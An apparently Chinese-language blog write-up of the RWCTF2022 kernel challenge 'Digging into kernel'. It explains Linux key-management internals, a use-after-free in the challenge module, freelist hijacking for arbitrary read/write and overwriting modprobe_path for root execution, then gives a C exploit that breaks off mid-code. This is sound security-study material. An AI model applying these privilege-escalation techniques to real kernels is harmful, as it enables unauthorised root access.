title="kernel密钥管理接口"></a>kernel密钥管理接口</h3><p>在linux内核中有一套专门用于管理密钥的子系统,负责密钥的创建,读取,更新以及销毁等功能</p><p>内核提供了两个系统调用来负责这些操作</p><p><code>add_key()</code>和<code>keyctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                                    <span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br></pre></td></tr></table></figure><p>当调用<code>add_key()</code>创建带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时</p><ul><li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> (字符串，最大大小为 4096)、<code>payload</code> (普通数据，大小无限制)</li><li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li><li>释放 obj1 与 obj2，返回密钥 id</li></ul><p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>由于decription和payload的长度都是可控的,那么<code>obj1-4</code>的大小其实也是可控的</p><p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）。</p><p><code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code> 决定</p><p>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong>,但是可以大于datalen。</p><p>当释放一个密钥时</p><p>内核中，对应的处理流程是<code>_x64_sys_keyctl() -&gt; keyctl_revoke_key() -&gt; key_revoke() -&gt; user_revoke() -&gt; call_rcu()</code>，在<code>call_rcu()</code>函数中将 <code>user_key_payload</code> 结构体的 <code>rcu.func</code> 设置成<code>user_free_payload_rcu()</code>函数的地址</p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><h2 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h2><h1 id="RWCTF2022-高校赛-Digging-into-kernel-1-amp-2"><a href="#RWCTF2022-高校赛-Digging-into-kernel-1-amp-2" class="headerlink" title="RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2"></a>RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor null \</span><br><span class="line">    --nographic</span><br></pre></td></tr></table></figure><p>开启了smap,smep</p><p>又可以发现开启了kpti</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure><p>这个题目给的cpio中并没有init脚本</p><p>不过可以发现 <code>xkmod.ko</code> ，按照惯例这应当就是有漏洞的 LKM，拖入 IDA 进行分析。</p><p>在模块载入时会新建一个 kmem_cache 叫 <code>&quot;lalala&quot;</code>，对应 object 大小是 192，这里我们注意到后面三个参数都是 0 ，对应的是 align(对齐),flags(标志位),ctor(构造函数)，由于没有设置 <code>SLAB_ACCOUNT</code> 标志位故该 <code>kmem_cache</code> <strong>会默认与 kmalloc-192 合并</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">xkmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  kmem_cache *v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_1E4);</span><br><span class="line">  misc_register(&amp;xkmod_device);</span><br><span class="line">  v0 = (kmem_cache *)kmem_cache_create(<span class="string">&quot;lalala&quot;</span>, <span class="number">192LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  s = v0;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的主要就是实现了ioctl,以及在关闭文件时会释放object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;v3, a3, <span class="number">16LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">107374182</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; v5 &lt;= <span class="number">0x50</span> &amp;&amp; v4 &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user((<span class="type">char</span> *)buf + (<span class="type">int</span>)v4, v3, (<span class="type">int</span>)v5);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">125269879</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">17895697</span> )</span><br><span class="line">          buf = (<span class="type">void</span> *)kmem_cache_alloc(s, <span class="number">3264LL</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; v5 &lt;= <span class="number">0x50</span> &amp;&amp; v4 &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_to_user(v3, (<span class="type">char</span> *)buf + (<span class="type">int</span>)v4);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xkmod_ioctl_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 buf 是一个全局指针，我们可以注意到 ioctl 中所有的操作<strong>都没有上锁</strong>。</p><p>漏洞点主要在关闭设备文件时会释放掉 buf，但是没有将 buf 指针置 NULL，<strong>只要我们同时打开多个设备文件便能完成 UAF</strong>。</p><p>需要的结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;data;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>首先因为uaf的存在,我们能够泄露一个object释放之后的内容</p><p>而kmem_cache的offset成员,决定了一个obj释放后的next指针位置</p><p>这里经过测试可以前八个字节就是一个内核地址,但是每次的页内偏移不同</p><p>由此可以知道</p><ol><li><code>offset==0</code></li><li>开启了RANDOM_FREELIST 保护</li><li>没有开启HARDENED_FREELIST保护</li></ol><p>freelist 随机化保护并非是一个运行时保护，而是在为 slub 分配页面时会将页面内的 object 指针随机打乱，<strong>但是在后面的分配释放中依然遵循着后进先出的原则</strong>，因此我们可以先获得一个 object 的 UAF，修改其 next 为我们想要分配的地址，之后我们连续进行两次分配<strong>便能够成功获得目标地址上的 object ，实现任意地址读写</strong>。</p><p>但这么做有着一个小问题，当我们分配到目标地址时<strong>目标地址前 8 字节的数据会被写入 freelist，而这通常并非一个有效的地址</strong>，从而导致 kernel panic，因此我们应当尽量选取目标地址往前的一个有着 8 字节 0 的区域，从而使得 freelist 获得一个 <strong>NULL 指针</strong>，促使 kmem_cache 向 buddy system 请求一个新的 slub，这样就不会发生 crash。</p><h3 id="泄露基址"><a href="#泄露基址" class="headerlink" title="泄露基址"></a>泄露基址</h3><p>接下来我们考虑如何泄露内核基址，虽然题目新建的 <code>kmem_cache</code> 会默认与 <code>kmalloc-192</code> 合并，但为了还原出题人原始意图，我们还是将其当作一个独立的 <code>kmem_cache</code> 来完成利用。</p><p>在内核 “堆基址”（<code>page_offset_base</code>） + <code>0x9d000</code> 处存放着 <code>secondary_startup_64(0xffffffff81000030)</code> 函数的地址，而我们可以从 free object 的 next 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 <code>堆基址 + 0x9d000</code> 处的 object 以泄露内核基址，这个地址前面刚好有一片为 NULL 的区域方便我们分配。</p><p>若是没有猜中，笔者认为直接重试即可，但这里需要注意的是我们不能够直接退出，而应当保留原进程的文件描述符打开，否则会在退出进程时触发 slub 的 double free 检测，不过经笔者测验大部分情况下都能够猜中堆基址。</p><h3 id="修改modprobe-path以root执行程序"><a href="#修改modprobe-path以root执行程序" class="headerlink" title="修改modprobe_path以root执行程序"></a>修改modprobe_path以root执行程序</h3><p>接下来我们考虑如何通过任意地址写完成利用，比较常规的做法是覆写内核中的一些全局的可写的函数表（例如 <code>n_tty_ops</code>）来劫持内核执行流，这里选择覆写 <code>modprobe_path</code> 从而以 root 执行程序。</p><p>当我们尝试去执行(execve)一个非法的文件(file magic not found,即文件格式头错误)，内核会经历如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() // wrapped as request_module</span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure><p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码（以下来着内核源码 5.14）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    argv[<span class="number">0</span>] = modprobe_path;<span class="comment">//argv[0]即运行程序名</span></span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = module_name;  <span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">    argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">                     <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!info)</span><br><span class="line">        <span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行，这个地址上默认存储的值为<code>/sbin/modprobe</code>。</p><p>我们不难想到的是：若是我们能够劫持 modprobe_path，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，<strong>内核将会以 root 权限执行我们的恶意脚本</strong>。</p><p>modprobe_path的地址可以由符号名直接搜索到</p><p>但是有些vmlinux似乎去除了这个符号</p><p>这个时候就可以通过搜索modprobe_path的初始符号值<code>/sbin/modprobe</code>寻找</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-01-27_230748.png" alt=""></p><p>例如本题最终底下那个就是modprobe的地址,最顶上那个对应直接映射区</p><p>又或者在<code>/proc/kallsyms</code>文件夹下找</p><p><code>grep modprobe_path /proc/kallsyms</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>流程就是利用uaf写一个obj的next指针</p><p>首先泄露page_offset_base进而再次泄露page_offset_base+0x9d000处的内核函数指针</p><p>从而得到内核映射基址</p><p>然后uaf写modprobe_path为创建的利用程序路径</p><p>最后打开一个非法文件触发利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xffffffff82444700</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOT_SCRIPT_PATH  <span class="string">&quot;/home/getshell&quot;</span></span></span><br><span class="line"><span class="type">char</span> root_cmd[] = <span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bindCore</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">allocBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">editBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> dev_fd[<span class="number">5</span>], root_script_fd, flag_fd;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak, kernel_text_leak;</span><br><span class="line">    <span class="type">size_t</span> kernel_base, kernel_offset, page_offset_base;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        dev_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create fake modprobe_path file */</span></span><br><span class="line">    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);</span><br><span class="line">    write(root_script_fd, root_cmd, <span class="keyword">sizeof</span>(root_cmd));</span><br><span class="line">    close(root_script_fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x &quot;</span> ROOT_SCRIPT_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF */</span></span><br><span class="line">    data.ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x50</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data.ptr, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    allocBuf(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    editBuf(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel heap addr and guess the page_offset_base */</span></span><br><span class="line">    readBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    kernel_heap_leak = data.ptr[<span class="number">0</span>];</span><br><span class="line">    page_offset_base = kernel_heap_leak &amp; <span class="number">0xfffffffff0000000</span>;<span class="comment">//直接映射区的后28位一般是0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel heap leak: 0x%lx\n&quot;</span>, kernel_heap_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] GUESSING page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to alloc fake chunk at (page_offset_base + 0x9d000 - 0x10) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leaking kernel base...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    